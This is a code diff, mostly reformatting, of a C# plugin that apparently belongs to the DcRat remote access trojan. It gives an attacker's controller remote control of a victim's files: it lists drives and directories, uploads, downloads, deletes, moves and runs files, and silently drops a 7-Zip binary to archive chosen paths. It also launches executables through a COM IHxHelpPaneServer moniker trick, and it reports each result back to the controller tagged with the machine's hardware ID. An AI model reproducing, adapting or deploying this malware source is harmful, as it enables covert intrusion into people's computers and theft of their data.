@@ -1,14 +1,13 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
+using System.Runtime.InteropServices;
 using System.Text;
-using System.Diagnostics;
+using System.Text.RegularExpressions;
 using System.Threading;
 using MessagePackLib.MessagePack;
-using System.Runtime.InteropServices;
-using Microsoft.Win32;
-using System.Text.RegularExpressions;
 
 namespace Plugin.Handler
 {
@@ -21,157 +20,163 @@ namespace Plugin.Handler
                 switch (unpack_msgpack.ForcePathObject("Command").AsString)
                 {
                     case "getDrivers":
-                        {
-                            GetDrivers();
-                            break;
-                        }
+                    {
+                        GetDrivers();
+                        break;
+                    }
 
                     case "getPath":
-                        {
-                            GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
-                            break;
-                        }
+                    {
+                        GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
+                        break;
+                    }
 
                     case "uploadFile":
+                    {
+                        var fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
+                        if (File.Exists(fullPath))
                         {
-                            string fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
-                            if (File.Exists(fullPath))
-                            {
-                                File.Delete(fullPath);
-                                Thread.Sleep(500);
-                            }
-                            unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
-                            break;
+                            File.Delete(fullPath);
+                            Thread.Sleep(500);
                         }
+
+                        unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
+                        break;
+                    }
 
                     case "reqUploadFile":
-                        {
-                            ReqUpload(unpack_msgpack.ForcePathObject("ID").AsString); ;
-                            break;
-                        }
+                    {
+                        ReqUpload(unpack_msgpack.ForcePathObject("ID").AsString);
+                        ;
+                        break;
+                    }
 
                     case "socketDownload":
-                        {
-                            DownnloadFile(unpack_msgpack.ForcePathObject("File").AsString, unpack_msgpack.ForcePathObject("DWID").AsString);
-                            break;
-                        }
+                    {
+                        DownnloadFile(unpack_msgpack.ForcePathObject("File").AsString,
+                            unpack_msgpack.ForcePathObject("DWID").AsString);
+                        break;
+                    }
 
                     case "deleteFile":
-                        {
-                            string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
-                            File.Delete(fullPath);
-                            break;
-                        }
+                    {
+                        var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
+                        File.Delete(fullPath);
+                        break;
+                    }
 
                     case "execute":
-                        {
-                            string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
-                            Execute(fullPath);
-                            break;
-                        }
+                    {
+                        var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
+                        Execute(fullPath);
+                        break;
+                    }
 
                     case "createFolder":
-                        {
-                            string fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
-                            if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);
-                            break;
-                        }
+                    {
+                        var fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
+                        if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);
+                        break;
+                    }
 
                     case "deleteFolder":
-                        {
-                            string fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
-                            if (Directory.Exists(fullPath)) Directory.Delete(fullPath, true);
-                            break;
-                        }
+                    {
+                        var fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
+                        if (Directory.Exists(fullPath)) Directory.Delete(fullPath, true);
+                        break;
+                    }
 
                     case "copyFile":
-                        {
-                            Packet.FileCopy = unpack_msgpack.ForcePathObject("File").AsString;
-                            break;
-                        }
+                    {
+                        Packet.FileCopy = unpack_msgpack.ForcePathObject("File").AsString;
+                        break;
+                    }
 
                     case "pasteFile":
+                    {
+                        var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
+                        if (fullPath.Length > 0)
                         {
-                            string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
-                            if (fullPath.Length > 0)
-                            {
-                                string[] filesArray = Packet.FileCopy.Split(new[] { "-=>" }, StringSplitOptions.None);
-                                for (int i = 0; i < filesArray.Length; i++)
+                            var filesArray = Packet.FileCopy.Split(new[] { "-=>" }, StringSplitOptions.None);
+                            for (var i = 0; i < filesArray.Length; i++)
+                                try
                                 {
-                                    try
+                                    if (filesArray[i].Length > 0)
                                     {
-                                        if (filesArray[i].Length > 0)
-                                        {
-                                            if (unpack_msgpack.ForcePathObject("IO").AsString == "copy")
-                                                File.Copy(filesArray[i], Path.Combine(fullPath, Path.GetFileName(filesArray[i])), true);
-                                            else
-                                                File.Move(filesArray[i], Path.Combine(fullPath, Path.GetFileName(filesArray[i])));
-                                        }
-                                    }
-                                    catch (Exception ex)
-                                    {
-                                        Error(ex.Message);
+                                        if (unpack_msgpack.ForcePathObject("IO").AsString == "copy")
+                                            File.Copy(filesArray[i],
+                                                Path.Combine(fullPath, Path.GetFileName(filesArray[i])), true);
+                                        else
+                                            File.Move(filesArray[i],
+                                                Path.Combine(fullPath, Path.GetFileName(filesArray[i])));
                                     }
                                 }
-                                Packet.FileCopy = null;
-                            }
-                            break;
+                                catch (Exception ex)
+                                {
+                                    Error(ex.Message);
+                                }
+
+                            Packet.FileCopy = null;
                         }
+
+                        break;
+                    }
 
                     case "renameFile":
-                        {
-                            File.Move(unpack_msgpack.ForcePathObject("File").AsString, unpack_msgpack.ForcePathObject("NewName").AsString);
-                            break;
-                        }
+                    {
+                        File.Move(unpack_msgpack.ForcePathObject("File").AsString,
+                            unpack_msgpack.ForcePathObject("NewName").AsString);
+                        break;
+                    }
 
                     case "renameFolder":
-                        {
-                            Directory.Move(unpack_msgpack.ForcePathObject("Folder").AsString, unpack_msgpack.ForcePathObject("NewName").AsString);
-                            break; ;
-                        }
+                    {
+                        Directory.Move(unpack_msgpack.ForcePathObject("Folder").AsString,
+                            unpack_msgpack.ForcePathObject("NewName").AsString);
+                        break;
+                        ;
+                    }
 
                     case "zip":
+                    {
+                        if (Packet.ZipPath == null) CheckForSevenZip();
+                        if (Packet.ZipPath == null)
                         {
-                            if (Packet.ZipPath == null)
-                            {
-                                CheckForSevenZip();
-                            }
-                            if (Packet.ZipPath == null)
-                            {
-                                Error("not installed!");
-                                return;
-                            }
-                            if (unpack_msgpack.ForcePathObject("Zip").AsString == "true")
-                            {
-                                StringBuilder sb = new StringBuilder();
-                                StringBuilder location = new StringBuilder();
-                                foreach (string path in unpack_msgpack.ForcePathObject("Path").AsString.Split(new[] { "-=>" }, StringSplitOptions.None))
-                                {
-                                    if (!string.IsNullOrWhiteSpace(path))
-                                    {
-                                        sb.Append($"-ir!\"{path}\" ");
-                                        if (location.Length == 0)
-                                        location.Append(Path.GetFullPath(path));
-                                    }
-                                }
-                                Debug.WriteLine(sb.ToString());
-                                Debug.WriteLine(location.ToString());
-                                ZipCommandLine(sb.ToString(), true, location.ToString());
-                            }
-                            else
-                            {
-                                ZipCommandLine(unpack_msgpack.ForcePathObject("Path").AsString, false, "");
-                            }
-                            break;
+                            Error("not installed!");
+                            return;
                         }
+
+                        if (unpack_msgpack.ForcePathObject("Zip").AsString == "true")
+                        {
+                            var sb = new StringBuilder();
+                            var location = new StringBuilder();
+                            foreach (var path in unpack_msgpack.ForcePathObject("Path").AsString
+                                         .Split(new[] { "-=>" }, StringSplitOptions.None))
+                                if (!string.IsNullOrWhiteSpace(path))
+                                {
+                                    sb.Append($"-ir!\"{path}\" ");
+                                    if (location.Length == 0)
+                                        location.Append(Path.GetFullPath(path));
+                                }
+
+                            Debug.WriteLine(sb.ToString());
+                            Debug.WriteLine(location.ToString());
+                            ZipCommandLine(sb.ToString(), true, location.ToString());
+                        }
+                        else
+                        {
+                            ZipCommandLine(unpack_msgpack.ForcePathObject("Path").AsString, false, "");
+                        }
+
+                        break;
+                    }
 
                     case "installZip":
-                        {
-                            InstallSevenZip(unpack_msgpack);
-                            break;
-                        }
+                    {
+                        InstallSevenZip(unpack_msgpack);
+                        break;
+                    }
                 }
-
             }
             catch (Exception ex)
             {
@@ -183,7 +188,6 @@ namespace Plugin.Handler
         private void ZipCommandLine(string args, bool isZip, string location)
         {
             if (isZip)
-            {
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "\"" + Packet.ZipPath + "\"",
@@ -191,30 +195,30 @@ namespace Plugin.Handler
                     WindowStyle = ProcessWindowStyle.Hidden,
                     CreateNoWindow = true,
                     UseShellExecute = false,
-                    ErrorDialog = false,
+                    ErrorDialog = false
                 });
-            }
             else
-            {
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "\"" + Packet.ZipPath + "\"",
-                    Arguments = $"x \"{args}\" -o\"{args.Replace(Path.GetFileName(args), "_" + Path.GetFileNameWithoutExtension(args))}\" -y",
+                    Arguments =
+                        $"x \"{args}\" -o\"{args.Replace(Path.GetFileName(args), "_" + Path.GetFileNameWithoutExtension(args))}\" -y",
                     WindowStyle = ProcessWindowStyle.Hidden,
                     CreateNoWindow = true,
                     UseShellExecute = false,
-                    ErrorDialog = false,
+                    ErrorDialog = false
                 });
-            }
         }
 
         private void CheckForSevenZip()
         {
             try
             {
-                string sevenZip64 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "7-Zip", "7z.exe");
-                string sevenZip32 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "7-Zip", "7z.exe");
-                string dcratSvenzip = Path.Combine(Path.GetTempPath(), "7-Zip", "7z.exe");
+                var sevenZip64 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
+                    "7-Zip", "7z.exe");
+                var sevenZip32 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
+                    "7-Zip", "7z.exe");
+                var dcratSvenzip = Path.Combine(Path.GetTempPath(), "7-Zip", "7z.exe");
 
                 if (File.Exists(sevenZip64))
                     Packet.ZipPath = sevenZip64;
@@ -238,17 +242,21 @@ namespace Plugin.Handler
         {
             try
             {
-                string dcratSvenzip = Path.Combine(Path.GetTempPath(), "7-Zip");
-                if (!Directory.Exists(dcratSvenzip))
+                var dcratSvenzip = Path.Combine(Path.GetTempPath(), "7-Zip");
+                if (!Directory.Exists(dcratSvenzip)) Directory.CreateDirectory(dcratSvenzip);
+
+                using (var fs = new FileStream(Path.Combine(dcratSvenzip, "7z.exe"), FileMode.Create))
                 {
-                    Directory.CreateDirectory(dcratSvenzip);
+                    fs.Write(unpack_msgpack.ForcePathObject("exe").GetAsBytes(), 0,
+                        unpack_msgpack.ForcePathObject("exe").GetAsBytes().Length);
                 }
 
-                using (FileStream fs = new FileStream(Path.Combine(dcratSvenzip, "7z.exe"), FileMode.Create))
-                    fs.Write(unpack_msgpack.ForcePathObject("exe").GetAsBytes(), 0, unpack_msgpack.ForcePathObject("exe").GetAsBytes().Length);
+                using (var fs = new FileStream(Path.Combine(dcratSvenzip, "7z.dll"), FileMode.Create))
+                {
+                    fs.Write(unpack_msgpack.ForcePathObject("dll").GetAsBytes(), 0,
+                        unpack_msgpack.ForcePathObject("dll").GetAsBytes().Length);
+                }
 
-                using (FileStream fs = new FileStream(Path.Combine(dcratSvenzip, "7z.dll"), FileMode.Create))
-                    fs.Write(unpack_msgpack.ForcePathObject("dll").GetAsBytes(), 0, unpack_msgpack.ForcePathObject("dll").GetAsBytes().Length);
                 Error("installation is done!");
             }
             catch (Exception ex)
@@ -261,23 +269,22 @@ namespace Plugin.Handler
         {
             try
             {
-                DriveInfo[] allDrives = DriveInfo.GetDrives();
-                MsgPack msgpack = new MsgPack();
+                var allDrives = DriveInfo.GetDrives();
+                var msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "fileManager";
                 msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                 msgpack.ForcePathObject("Command").AsString = "getDrivers";
-                StringBuilder sbDriver = new StringBuilder();
-                foreach (DriveInfo d in allDrives)
+                var sbDriver = new StringBuilder();
+                foreach (var d in allDrives)
                 {
-                    if (d.IsReady)
-                    {
-                        sbDriver.Append(d.Name + "-=>" + d.DriveType + "-=>");
-                    }
+                    if (d.IsReady) sbDriver.Append(d.Name + "-=>" + d.DriveType + "-=>");
                     msgpack.ForcePathObject("Driver").AsString = sbDriver.ToString();
                     Connection.Send(msgpack.Encode2Bytes());
                 }
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         public void GetPath(string path)
@@ -285,32 +292,31 @@ namespace Plugin.Handler
             try
             {
                 Debug.WriteLine($"Getting [{path}]");
-                MsgPack msgpack = new MsgPack();
+                var msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "fileManager";
                 msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                 msgpack.ForcePathObject("Command").AsString = "getPath";
-                StringBuilder sbFolder = new StringBuilder();
-                StringBuilder sbFile = new StringBuilder();
+                var sbFolder = new StringBuilder();
+                var sbFile = new StringBuilder();
 
                 if (path == "DESKTOP") path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-                if (path == "APPDATA") path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData");
+                if (path == "APPDATA")
+                    path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData");
                 if (path == "USER") path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
 
-                foreach (string folder in Directory.GetDirectories(path))
-                {
+                foreach (var folder in Directory.GetDirectories(path))
                     sbFolder.Append(Path.GetFileName(folder) + "-=>" + Path.GetFullPath(folder) + "-=>");
-                }
-                foreach (string file in Directory.GetFiles(path))
-                {
-                    using (MemoryStream ms = new MemoryStream())
+                foreach (var file in Directory.GetFiles(path))
+                    using (var ms = new MemoryStream())
                     {
                         GetIcon(file.ToLower()).Save(ms, ImageFormat.Png);
-                        sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>" + new FileInfo(file).Length.ToString() + "-=>");
+                        sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" +
+                                      Convert.ToBase64String(ms.ToArray()) + "-=>" + new FileInfo(file).Length + "-=>");
                     }
-                }
+
                 msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
                 msgpack.ForcePathObject("File").AsString = sbFile.ToString();
-                msgpack.ForcePathObject("CurrentPath").AsString = path.ToString();
+                msgpack.ForcePathObject("CurrentPath").AsString = path;
                 Connection.Send(msgpack.Encode2Bytes());
             }
             catch (Exception ex)
@@ -324,18 +330,17 @@ namespace Plugin.Handler
         {
             try
             {
-                if (file.EndsWith("jpg") || file.EndsWith("jpeg") || file.EndsWith("gif") || file.EndsWith("png") || file.EndsWith("bmp"))
+                if (file.EndsWith("jpg") || file.EndsWith("jpeg") || file.EndsWith("gif") || file.EndsWith("png") ||
+                    file.EndsWith("bmp"))
+                    using (var myBitmap = new Bitmap(file))
+                    {
+                        return new Bitmap(myBitmap.GetThumbnailImage(48, 48, () => false, IntPtr.Zero));
+                    }
+
+                using (var icon = Icon.ExtractAssociatedIcon(file))
                 {
-                    using (Bitmap myBitmap = new Bitmap(file))
-                    {
-                        return new Bitmap(myBitmap.GetThumbnailImage(48, 48, new Image.GetThumbnailImageAbort(() => false), IntPtr.Zero));
-                    }
+                    return icon.ToBitmap();
                 }
-                else
-                    using (Icon icon = Icon.ExtractAssociatedIcon(file))
-                    {
-                        return icon.ToBitmap();
-                    }
             }
             catch
             {
@@ -345,11 +350,11 @@ namespace Plugin.Handler
 
         public void DownnloadFile(string file, string dwid)
         {
-            TempSocket tempSocket = new TempSocket();
+            var tempSocket = new TempSocket();
 
             try
             {
-                MsgPack msgpack = new MsgPack();
+                var msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "socketDownload";
                 msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                 msgpack.ForcePathObject("Command").AsString = "pre";
@@ -359,7 +364,7 @@ namespace Plugin.Handler
                 tempSocket.Send(msgpack.Encode2Bytes());
 
 
-                MsgPack msgpack2 = new MsgPack();
+                var msgpack2 = new MsgPack();
                 msgpack2.ForcePathObject("Pac_ket").AsString = "socketDownload";
                 msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                 msgpack2.ForcePathObject("Command").AsString = "save";
@@ -371,68 +376,67 @@ namespace Plugin.Handler
             catch
             {
                 tempSocket?.Dispose();
-                return;
             }
         }
 
-        [ComImport, Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-        interface IHxHelpPaneServer
-        {
-            void DisplayTask(string task);
-            void DisplayContents(string contents);
-            void DisplaySearchResults(string search);
-            void Execute([MarshalAs(UnmanagedType.LPWStr)] string file);
-        }
-
         public void Execute(string fullpath)
-        {            
-            bool ContaainChinese = false;
-            for (int i = 0; i < fullpath.Length; i++)
-            {
+        {
+            var ContaainChinese = false;
+            for (var i = 0; i < fullpath.Length; i++)
                 if (Regex.IsMatch(fullpath[i].ToString(), @"[\u4e00-\u9fbb]"))
                 {
                     ContaainChinese = true;
                     break;
                 }
-            }
-            if (Regex.IsMatch(fullpath, @"(.*)(\.exe)$")&& ContaainChinese == false)
+
+            if (Regex.IsMatch(fullpath, @"(.*)(\.exe)$") && ContaainChinese == false)
             {
-                IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee"));
-                Uri target = new Uri(fullpath);
+                var server = (IHxHelpPaneServer)Marshal.BindToMoniker("new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee");
+                var target = new Uri(fullpath);
                 server.Execute(target.AbsoluteUri);
             }
             else
             {
                 Process.Start(fullpath);
             }
-
         }
 
         public void ReqUpload(string id)
         {
             try
             {
-                TempSocket tempSocket = new TempSocket();
-                MsgPack msgpack = new MsgPack();
+                var tempSocket = new TempSocket();
+                var msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "fileManager";
                 msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                 msgpack.ForcePathObject("Command").AsString = "reqUploadFile";
                 msgpack.ForcePathObject("ID").AsString = id;
                 tempSocket.Send(msgpack.Encode2Bytes());
             }
-            catch { return; }
+            catch
+            {
+            }
         }
 
         public void Error(string ex)
         {
-            MsgPack msgpack = new MsgPack();
+            var msgpack = new MsgPack();
             msgpack.ForcePathObject("Pac_ket").AsString = "fileManager";
             msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
             msgpack.ForcePathObject("Command").AsString = "error";
             msgpack.ForcePathObject("Message").AsString = ex;
             Connection.Send(msgpack.Encode2Bytes());
         }
+
+        [ComImport]
+        [Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee")]
+        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        private interface IHxHelpPaneServer
+        {
+            void DisplayTask(string task);
+            void DisplayContents(string contents);
+            void DisplaySearchResults(string search);
+            void Execute([MarshalAs(UnmanagedType.LPWStr)] string file);
+        }
     }
-
 }
-
